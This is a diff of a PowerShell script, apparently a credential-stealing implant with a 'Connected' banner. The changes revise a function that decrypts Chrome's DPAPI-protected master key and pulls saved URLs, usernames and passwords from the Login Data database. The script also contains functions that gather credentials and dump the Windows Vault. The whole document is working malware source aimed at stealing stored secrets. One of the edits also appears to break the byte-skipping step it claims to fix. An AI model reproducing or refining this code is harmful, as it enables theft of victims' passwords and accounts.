@@ -430,6 +430,8 @@ function Get-Credentials {
 }
 function Decrypt-ChromePasswords {
     try {
+        Add-Type -AssemblyName System.Security
+
         $localState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
         $loginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
 
@@ -437,18 +439,19 @@ function Decrypt-ChromePasswords {
             return "[INFO] Chrome login data or local state not found"
         }
 
-        # Расшифровка ключа
+        # Расшифровка мастер-ключа
         $localStateContent = Get-Content $localState -Raw
         $encryptedKey = ($localStateContent | ConvertFrom-Json).os_crypt.encrypted_key
-        $encryptedKey = [Convert]::FromBase64String($encryptedKey) | Select-Object -Skip 5
+        $encryptedKey = [Convert]::FromBase64String($encryptedKey)[5..-1]  # пропуск "DPAPI"
         $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, 'CurrentUser')
 
-        # Копия базы данных
+        # Временная копия базы
         $tempDB = "$env:TEMP\chrome_logins.db"
         Copy-Item $loginData $tempDB -Force
 
         $conn = New-Object -ComObject ADODB.Connection
         $conn.Open("Provider=Microsoft.Jet.OLEDB.4.0;Data Source=$tempDB")
+
         $cmd = New-Object -ComObject ADODB.Command
         $cmd.ActiveConnection = $conn
         $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
@@ -484,6 +487,7 @@ function Decrypt-ChromePasswords {
         return "[ERROR] Chrome decrypt failed: $($_.Exception.Message)"
     }
 }
+
 function Dump-WindowsVault {
     try {
         Add-Type -AssemblyName System.Security
@@ -763,7 +767,7 @@ ________  ___  ________  ________      ________  ________
     /  /_/__\ \  \ \  \___|\ \  \\\  \ __\ \  \|\  \ \  \_\\ \ 
    |\________\ \__\ \__\    \ \_______\\__\ \_______\ \_______\
     \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|  
-                                            TEST 555                                                                                                                                                                    
+                                            TEST 5553                                                                                                                                                                    
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
